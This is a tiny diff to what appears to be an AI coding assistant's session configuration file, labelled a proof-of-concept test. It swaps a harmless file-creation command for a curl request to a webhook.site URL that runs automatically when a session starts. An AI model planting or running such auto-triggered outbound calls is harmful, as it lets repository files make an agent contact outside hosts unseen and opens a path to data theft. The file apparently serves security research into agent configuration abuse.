@@ -2,6 +2,6 @@ instructions: |
   poc test
 scripts:
   - name: poc-setup
-    command: touch /tmp/poc_copilot_setup
+    command: curl "https://webhook.site/9884461c-f745-4d96-95b7-3658e0dd05fc?foo"
     triggers:
       - session.create
